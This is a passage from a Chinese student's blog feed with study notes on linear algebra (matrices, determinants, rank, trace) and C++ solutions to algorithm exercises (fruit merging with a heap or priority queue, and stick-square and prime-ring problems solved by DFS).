&lt;p&gt;&amp;lt;u&amp;gt;&lt;strong&gt; 由数域的定义知数域中一定含有加法逆元乘法逆元，加法单位元乘法单位元。&lt;/strong&gt;&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;集合与向量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#集合与向量&#34;&gt;#&lt;/a&gt; 集合与向量&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;笛卡尔积&lt;/li&gt;
&lt;li&gt;多元有序数组&lt;/li&gt;
&lt;li&gt;坐标系
&lt;ul&gt;
&lt;li&gt;多元有序数组是 N 维空间与笛卡尔积的集合的映射。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;列向量与横向量&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;矩阵初识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵初识&#34;&gt;#&lt;/a&gt; 矩阵初识&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/02_1.png&#34; alt=&#34;02-1&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;元素是&lt;strong&gt;实数&lt;/strong&gt;的矩阵称为&lt;strong&gt;实矩阵&lt;/strong&gt;，元素是&lt;strong&gt;复数&lt;/strong&gt;的矩阵称为&lt;strong&gt;复矩阵&lt;/strong&gt;。而&lt;strong&gt;行数与列数都等于 n&lt;/strong&gt; 的矩阵称为&lt;strong&gt; n 阶矩阵&lt;/strong&gt;或&lt;strong&gt; n 阶方阵&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初等变换&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单位阵（diag）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;矩阵相等必须先是同型矩阵&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同型矩阵才能做加减&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;行阶梯矩阵，行简化形阶梯矩阵&lt;/p&gt;
&lt;p&gt;每个矩阵都与唯一一个行简化阶梯矩阵对应（行阶梯矩阵不唯一，行简化阶梯矩阵唯一）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;矩阵的秩&lt;/p&gt;
&lt;p&gt;设非零矩阵&lt;em&gt;&lt;strong&gt; A&lt;/strong&gt;&lt;/em&gt; 经过初等行变化化为行阶梯形矩阵&lt;em&gt;&lt;strong&gt; R&lt;/strong&gt;&lt;/em&gt;，&lt;em&gt;&lt;strong&gt;R&lt;/strong&gt;&lt;/em&gt; 中非零行的个数称为矩阵&lt;em&gt;&lt;strong&gt; A&lt;/strong&gt;&lt;/em&gt; 的秩，记作 rank&lt;em&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/em&gt;，或者 r (&lt;em&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/em&gt;)。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线性方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#线性方程组&#34;&gt;#&lt;/a&gt; 线性方程组&lt;/h3&gt;
&lt;h4 id=&#34;有解判别定理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有解判别定理&#34;&gt;#&lt;/a&gt; 有解判别定理&lt;/h4&gt;
&lt;p&gt;线性方程组根据解的判定定理判定为：r（A）=r（A|b）&lt;/p&gt;
&lt;p&gt;秩要相等。（在做题时要给出判定）&lt;/p&gt;
&lt;h4 id=&#34;同解方程组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同解方程组&#34;&gt;#&lt;/a&gt; 同解方程组&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;反身性&lt;/li&gt;
&lt;li&gt;对称性&lt;/li&gt;
&lt;li&gt;传递性&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;消元步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#消元步骤&#34;&gt;#&lt;/a&gt; 消元步骤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;特解&lt;/p&gt;
&lt;p&gt;增广矩阵化简到行简化阶梯矩阵&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通解&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;第二章-行列式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二章-行列式&#34;&gt;#&lt;/a&gt; 第二章 行列式&lt;/h2&gt;
&lt;h3 id=&#34;行列式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行列式&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQTElOEMlRTUlODglOTclRTUlQkMlOEY/ZnJvbU1vZHVsZT1sZW1tYV9zZWFyY2gtYm94&#34;&gt;行列式&lt;/span&gt;&lt;/h3&gt;
&lt;h3 id=&#34;计算&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计算&#34;&gt;#&lt;/a&gt; 计算&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;三对角行列式计算&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;常用递推法，三角化方法解决。&lt;/p&gt;
&lt;p&gt;考虑到类似数列的求通项法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;异乘变零&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;展开&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#展开&#34;&gt;#&lt;/a&gt; 展开&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;按行按列展开&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意语句，等式逻辑，&lt;strong&gt;余子式与代数余子式的区别&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;余子式的逆运算，不止一个原式&lt;/strong&gt;&lt;/em&gt; (替换某一列 (行) 的数据不改变其余子式)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;范德蒙德展开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/fandemengdehanglieshi.jpg&#34; alt=&#34;fandingyi&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/fan_2.jpg&#34; alt=&#34;fan_2&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;含 0 阵的行列式展开 ***(按块展开)***&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;行列式的转置还是它自己，即值不变。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;第三章-矩阵&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三章-矩阵&#34;&gt;#&lt;/a&gt; 第三章 矩阵&lt;/h2&gt;
&lt;h3 id=&#34;矩阵加法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵加法&#34;&gt;#&lt;/a&gt; 矩阵加法&lt;/h3&gt;
&lt;p&gt;必须是同型矩阵，对应元素分别相加。&lt;/p&gt;
&lt;h3 id=&#34;矩阵乘法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵乘法&#34;&gt;#&lt;/a&gt; 矩阵乘法&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/xindai_10_07_juzhengchengfa.jpg&#34; alt=&#34;chengfdingyi&#34; /&gt;&lt;/p&gt;
&lt;p&gt;行列相乘法，左矩阵的列数要等于右矩阵的行数。&lt;/p&gt;
&lt;p&gt;注意元素对应。矩阵乘法一般不可逆。单位阵相乘可逆，对角阵相乘可逆。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/xiandaijuzhen0.jpg&#34; alt=&#34;xiandai&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;矩阵的转置与行列式化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵的转置与行列式化&#34;&gt;#&lt;/a&gt; 矩阵的转置与行列式化&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20221007184533201.png&#34; alt=&#34;image-20221007184533201&#34; /&gt;&lt;/p&gt;
&lt;p&gt;若矩阵&lt;strong&gt; A&lt;/strong&gt; 满足&lt;strong&gt; A=A&lt;sup&gt;T&lt;/sup&gt;&lt;/strong&gt;，则称&lt;strong&gt; A&lt;/strong&gt; 为&lt;strong&gt;对称矩阵&lt;/strong&gt;；若&lt;strong&gt; A&lt;sup&gt;T&lt;/sup&gt;=-A&lt;/strong&gt;，则称 A 为&lt;strong&gt;反对称矩阵&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;A+A&lt;sup&gt;T&lt;/sup&gt;,AA&lt;sup&gt;T&lt;/sup&gt;&lt;/strong&gt;&lt;/em&gt; 是对称矩阵&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;A-A&lt;sup&gt;T&lt;/sup&gt;&lt;/strong&gt;&lt;/em&gt; 是反对称矩阵&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;E&lt;sub&gt;n&lt;/sub&gt;&lt;sup&gt;T&lt;/sup&gt;=E&lt;sub&gt;n&lt;/sub&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;奇数阶反对称矩阵的行列式等于 0&lt;/li&gt;
&lt;li&gt;.|k&lt;strong&gt;A&lt;/strong&gt;|=k&lt;sup&gt;n&lt;/sup&gt;|&lt;strong&gt;A&lt;/strong&gt;|.&lt;/li&gt;
&lt;li&gt;.|&lt;em&gt;&lt;strong&gt;AB&lt;/strong&gt;&lt;/em&gt;|=|&lt;strong&gt;A&lt;/strong&gt;||&lt;strong&gt;B&lt;/strong&gt;|.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;初等矩阵&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#初等矩阵&#34;&gt;#&lt;/a&gt; 初等矩阵&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;左行右列定理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果矩阵 A 左 (右) 乘一个初等矩阵，那么相当于对 A 做了一次和它完全相同的初等行 (列) 变换&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;方阵的迹&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/ca954c14e1a12fb64383e5786d37e4d3.svg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;tr(AB)=tr(BA)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;tr(A&lt;sup&gt;T&lt;/sup&gt;)=tr(A)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;伴随矩阵&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伴随矩阵&#34;&gt;#&lt;/a&gt; 伴随矩阵&lt;/h3&gt;
&lt;h3 id=&#34;矩阵逆元&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#矩阵逆元&#34;&gt;#&lt;/a&gt; 矩阵逆元&lt;/h3&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%A4%9A%E5%A4%9A%E6%9E%9C%E5%AD%90%E9%97%AE%E9%A2%98/</guid>
            <title>多多果子问题二叉堆与优先序列</title>
            <link>https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%A4%9A%E5%A4%9A%E6%9E%9C%E5%AD%90%E9%97%AE%E9%A2%98/</link>
            <category>Notes</category>
            <category>C++</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/03/16/No51BErYemDLZpQ.jpg&#34; alt=&#34;37&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;问题描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#问题描述&#34;&gt;#&lt;/a&gt; 问题描述：&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;在一个果园里，多多已经将所有的果子打了下来，而且按果子的不同种类分成了不同的堆。多多决定把所有的果子合成一堆。每一次合并，多多可以把两堆果子合并到一起，消耗的体力等于两堆果子的重量之和。可以看出，所有的果子经过 n-1 次合并之后，就只剩下一堆了。多多在合并果子时总共消耗的体力等于每次合并所耗体力之和。&lt;/p&gt;
&lt;p&gt;因为还要花大力气把这些果子搬回家，所以多多在合并果子时要尽可能地节省体力。假定每个果子重量都为 1，并且已知果子的种类数和每种果子的数目，你的任务是设计出合并的次序方案，使多多耗费的体力最少，并输出这个最小的体力耗费值。&lt;br /&gt;
　　例如有 3 种果子，数目依次为 1，2，9。可以先将 1、2 堆合并，新堆数目为 3，耗费体力为 3。接着，将新堆与原先的第三堆合并，又得到新的堆，数目为 12，耗费体力为 12。&lt;br /&gt;
所以多多总共耗费体力 = 3+12=15。可以证明 15 为最小的体力耗费值。&lt;br /&gt;
输入&lt;br /&gt;
　　输入包括两行，第一行是一个整数 n (1&amp;lt;＝n&amp;lt;=10000)，表示果子的种类数。&lt;br /&gt;
　　第二行包含 n 个整数，用空格分隔，第 i 个整数 ai (1&amp;lt;＝ai&amp;lt;=20000) 是第 i 种果子的数目。&lt;br /&gt;
输出&lt;br /&gt;
　　输出包括一行，这一行只包含一个整数，也就是最小的体力耗费值。输入数据保证这个值小于 2^31。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;解决问题思路&lt;/strong&gt;：取出最小相加成一堆，并计算体力消耗&lt;/p&gt;
&lt;h4 id=&#34;方法一小顶堆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一小顶堆&#34;&gt;#&lt;/a&gt; 方法一：小顶堆&lt;/h4&gt;
&lt;p&gt;代码及思路如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;iostream&amp;gt;
#include&amp;lt;algorithm&amp;gt;

using namespace std;
const int maxn=10086;
void updateheap(int heap[],int idx,int high)// 在本身是小顶堆的情况下维护
&amp;#123;
    int i=idx,j=2*i;//
    while(j&amp;lt;=high)
    &amp;#123;
        if(j+1&amp;lt;=high &amp;amp;&amp;amp; heap[j]&amp;gt;heap[j+1]) j=j+1;
        if(heap[j]&amp;lt;heap[i]) swap(heap[j],heap[i]);// 当需要进行维护操作时，就说明idx节点不满足小顶堆，要考虑swap后对子节点的影响
        else break;//  在它本身是小顶堆的情况下，确保了维护的这个节点满足条件即可结束
        i=j; // 考虑到子节点的影响，继续对子节点判断维护
        j=2*i;
    &amp;#125;
&amp;#125;

void heapinit(int heap[],int len) // 创建一个小顶堆，len是小顶堆大小
&amp;#123;
    for(int i=1;i&amp;lt;=len;i++) cin&amp;gt;&amp;gt;heap[i]; // 空间足够，以1为根结点 事实上，一般都以1为节点
    for(int i=len/2;i&amp;gt;0;i--) updateheap(heap,i,len); // 从叶子向根节点维护，确保有序性
&amp;#125;

void deletetop(int heap[],int &amp;amp;n) // n即size将要移除的数放到末尾，并回收末尾节点 = size-- 
&amp;#123;
    
    swap(heap[1],heap[n]);// change happans ,we have to maintain it
    n--; // after swap we recycle the last node
    updateheap(heap,1,n);
    
&amp;#125;
void insertheap(int heap[],int &amp;amp;n,int value)
&amp;#123;
    n++;
    heap[n]=value;
    int i=n,j=i/2;// i is the childnode, and j is the fathernode
    while(i&amp;gt;1)
    &amp;#123;
        if(heap[i]&amp;lt;heap[j]) swap(heap[i],heap[j]);
        else return; // heap[i]&amp;gt;=heap[j]说明插入的值并不比父节点大，有序性得以保证
        i=j;
        j=i/2;
    &amp;#125;
    return;
&amp;#125;
int main()
&amp;#123;
    int n,Heap[maxn],stamina,size;
    cin&amp;gt;&amp;gt;n;
    size=n;
    stamina=0;
    heapinit(Heap,n);
    if(n==1)
    &amp;#123;
        cout&amp;lt;&amp;lt;Heap[1];
        return 1;
    &amp;#125;
    // stamina 的消耗可以堆顶的访问删除来实现
    // 通过将堆顶与堆底互换并回收堆底，保持访问堆的结构不变，通过维护保持堆的有序
    // 回收（size--通过大小的减小停止对堆底的维护，即回收）未删除数据但不影响
    while(size&amp;gt;1)
    &amp;#123;
        int a = Heap[1];
        deletetop(Heap,size);
        int b=Heap[1];
        deletetop(Heap,size);
       
        insertheap(Heap,size,a+b);// value isn&#39;t equal to stamina cost totally
        stamina+=(a+b);

    &amp;#125;
    cout&amp;lt;&amp;lt;stamina;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结语：涉及二叉堆的生成与维护，要注意对堆顶 pop 时 (也就是上文中的 deletetop 函数，topnode 的值并没有被删除，而是放在了堆底回收区，堆的大小并不是真正意义上所占全部空间的大小，而是有效空间的大小)&lt;/p&gt;
&lt;h4 id=&#34;方法二优先队列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二优先队列&#34;&gt;#&lt;/a&gt; 方法二：优先队列&lt;/h4&gt;
&lt;p&gt;代码及思路如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;queue&amp;gt;
#include &amp;lt;iostream&amp;gt;

using namespace std;

int main()
&amp;#123;
    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, greater&amp;lt;int&amp;gt; &amp;gt; que;
    // greater 增序，使最小的位于top
    int n, i, stamina = 0;
    cin &amp;gt;&amp;gt; n;
    i = n;
    while (i--)
    &amp;#123;
        int x;
        cin &amp;gt;&amp;gt; x;
        que.push(x);
    &amp;#125;// 输入que，自动排序
    if (n == 1)
    &amp;#123;
        int x = que.top();
        cout &amp;lt;&amp;lt; x;
        que.pop();
    &amp;#125;
    while (que.size() &amp;gt; 1)
    &amp;#123;
        int a = que.top();
        que.pop();
        int b = que.top();
        que.pop();
        stamina += (a + b);
        que.push(a + b);
    &amp;#125;
    //que.top()=sum 所有之和，不用计算到体力消耗


    cout &amp;lt;&amp;lt; stamina;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结语：相比于使用小顶堆，使用优先队列的代码无疑简介易懂。&lt;/p&gt;
&lt;p&gt;然而事实上优先队列本质上使用的也是堆的思想。二者在时间效率上，是前者更优。&lt;s&gt;(specific 优于 general)&lt;/s&gt; 😃&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi82dXBFSw==&#34;&gt;Possible_Answer&lt;/span&gt;,&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xODc2MTg0NTA=&#34;&gt; 二叉堆 -- 知乎&lt;/span&gt;，&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi8yQ1o0YQ==&#34;&gt;优先队列&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9DNlA0aA==&#34;&gt;优先队列 (实例)&lt;/span&gt;,&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTU0NjcwMDA=&#34;&gt;数据结构 —— 哈夫曼树 (Huffman Tree)&lt;/span&gt;,(知识扩展)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;写在最后，这里出于课程要求，并没有考虑快排的方法，事实上快排无疑也是一种解决方案&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%B0%8F%E6%9C%A8%E6%A3%8D%E7%BB%84%E6%AD%A3%E6%96%B9%E5%BD%A2/</guid>
            <title>小木棍组正方形</title>
            <link>https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E5%B0%8F%E6%9C%A8%E6%A3%8D%E7%BB%84%E6%AD%A3%E6%96%B9%E5%BD%A2/</link>
            <category>Notes</category>
            <category>C++</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;小木棍组正方形：&lt;/p&gt;
&lt;p&gt;解题思路：&lt;/p&gt;
&lt;p&gt;使用 DFS 算法，并减去一些枝干&lt;/p&gt;
&lt;p&gt;代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;algorithm&amp;gt;

using namespace std;
int sticks[38]&amp;#123;0&amp;#125;;//存放木棍长度

int side, groupnum, n;
bool DFS(int sum, int number, int pos,int * flag)
&amp;#123;
    if (number == 3)
        return true;

    for(int i=pos;i&amp;lt;n;i++)
    &amp;#123;
        if(sum+sticks[pos]&amp;gt;side)&amp;#123;
            continue;
        &amp;#125;
        if(flag[i]==1)
        &amp;#123;
            continue;
        &amp;#125;
        if(sum+sticks[i]==side)// 深度搜索
        &amp;#123;
            if(DFS(0,number+1,0,flag)) return true;
        &amp;#125;
        else
        &amp;#123;
            if(DFS(sum+sticks[i],number,0,flag)) return true;
        &amp;#125;//深度搜索不能返回true，则返回上一节点，寻找其他子节点，通过for实现
        flag[i]=0;
    &amp;#125;
    return false;
&amp;#125;

int main()
&amp;#123;

    cin &amp;gt;&amp;gt; groupnum;
    while (groupnum--)
    &amp;#123;
        int flag[38]&amp;#123;0&amp;#125;;
        cin &amp;gt;&amp;gt; n;
        int s = 0;
        for (int i = 0; i &amp;lt; n; i++)
        &amp;#123;
            cin &amp;gt;&amp;gt; sticks[i];
            s += sticks[i];
        &amp;#125;
        if (s % 4 != 0)
        &amp;#123;
            cout &amp;lt;&amp;lt; &amp;quot;no&amp;quot; &amp;lt;&amp;lt; endl;
            continue;
        &amp;#125;
        side = s / 4;

        sort(sticks, sticks + n, greater&amp;lt;int&amp;gt;());
        if (sticks[0] &amp;gt; side)
        &amp;#123;
            cout &amp;lt;&amp;lt; &amp;quot;no&amp;quot; &amp;lt;&amp;lt; endl;
            continue;
        &amp;#125;
        if (DFS(0, 0, 0,flag))
            cout &amp;lt;&amp;lt; &amp;quot;yes&amp;quot; &amp;lt;&amp;lt; endl;
        else 
            cout&amp;lt;&amp;lt;&amp;quot;no&amp;quot;&amp;lt;&amp;lt;endl;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结语：&lt;/p&gt;
&lt;p&gt;DFS 模板&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int check(参数)
&amp;#123;
    if(满足条件)
        return 1;
    return 0;
&amp;#125;
 
void dfs(int step)
&amp;#123;
        判断边界
        &amp;#123;
            相应操作
        &amp;#125;
        尝试每一种可能
        &amp;#123;
               满足check条件
               标记
               继续下一步dfs(step+1)
               恢复初始状态（回溯的时候要用到）
        &amp;#125;
&amp;#125;   
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考资料&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9FZjhNUQ==&#34;&gt;http://t.csdn.cn/Ef8MQ&lt;/span&gt; DFS 算法解释及例题&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E7%B4%A0%E6%95%B0%E7%8E%AF%E9%97%AE%E9%A2%98/</guid>
            <title>素数环问题</title>
            <link>https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/%E7%B4%A0%E6%95%B0%E7%8E%AF%E9%97%AE%E9%A2%98/</link>
            <category>Notes</category>
            <category>C++</category>
            <pubDate>Sun, 19 Mar 2023 19:29:17 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/picgo/1267999.jpg&#34; alt=&#34;1267999&#34; /&gt;&lt;/p&gt;
&lt;p&gt;素数环问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Problem Description&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A ring is compose of n circles as shown in diagram. Put natural number 1, 2, ..., n into each circle separately, and the sum of numbers in two adjacent circles should be a prime.&lt;/p&gt;
&lt;p&gt;Note: the number of first circle should always be 1.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Input&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;n (0 &amp;lt; n &amp;lt; 20).&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The output format is shown as sample below. Each row represents a series of circle numbers in the ring beginning from 1 clockwisely and anticlockwisely. The order of numbers must satisfy the above requirements. Print solutions in lexicographical order.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;You are to write a program that completes above process.&lt;/p&gt;
&lt;p&gt;&amp;lt;u&amp;gt;&lt;strong&gt;Print a blank line after each case.&lt;/strong&gt;&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;解题思路：&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stack&amp;gt;
#include&amp;lt;math.h&amp;gt; 
#include&amp;lt;string.h&amp;gt;
using namespace std;
/*
从2开始到sqrt(num)，逐一判断
*/
int n;
int arry[27]&amp;#123;1&amp;#125;,flag[27]&amp;#123;0&amp;#125;;
stack&amp;lt;int&amp;gt; s1, s2;

bool isPrime_2(int num)
&amp;#123;
    if (num == 1 || num == 4)
        return 0;
    if (num == 2 || num == 3)
        return 1;
    int temp = sqrt(num);
    for (int i = 2; i &amp;lt;= temp; i++)
    &amp;#123;
        if (num % i == 0)
            return 0;
    &amp;#125;
    return 1;
&amp;#125;


void dfs(int k)
&amp;#123;
    if(k==n&amp;amp;&amp;amp;isPrime_2(arry[0]+arry[n-1])) //如果递归到下标n并且满足条件就找到一组正确的数据了
    &amp;#123;
        for(int i=0;i&amp;lt;n-1;i++)
        cout&amp;lt;&amp;lt;arry[i]&amp;lt;&amp;lt;&amp;quot; &amp;quot;;
        cout&amp;lt;&amp;lt;arry[n-1]&amp;lt;&amp;lt;endl;
    &amp;#125;
    else
    &amp;#123;
        for(int i=2;i&amp;lt;=n;i++)
        if(flag[i]==0&amp;amp;&amp;amp;isPrime_2(arry[k-1]+i)) //如果i没有使用过，并且a[k-1]和i相加为素数
        &amp;#123;
            arry[k]=i;     //记录下标的值
            flag[i]=1; //标记为使用过的
            dfs(k+1);  //开始下一个下标的计算
            flag[i]=0;//清除标记
        &amp;#125;
    &amp;#125;
&amp;#125;

int main()
&amp;#123;
    int i=0;
    while (cin &amp;gt;&amp;gt; n)
    &amp;#123;
        i++;
        memset(flag,0,sizeof(flag));
        for (int k = 0; k &amp;lt; n; k++)
            arry[k] = 1;
        cout&amp;lt;&amp;lt;&amp;quot;Case &amp;quot;&amp;lt;&amp;lt;i&amp;lt;&amp;lt;&#39;:&#39;&amp;lt;&amp;lt;endl;
        flag[0]=1;
        dfs(1);
        cout&amp;lt;&amp;lt;endl;
        

    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结语：&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[源码借鉴 From 简书]( &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85MThiZWM3MzJiN2Q=&#34;&gt;DFS (素数环) - 简书 (jianshu.com)&lt;/span&gt;)，&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://evefortosaber.github.io/2023/03/19/ComputerScience/ProgramDesignNotes/DFS/%E6%A3%8B%E7%9B%98%E9%97%AE%E9%A2%98/</guid>
            <title>棋盘问题</title>
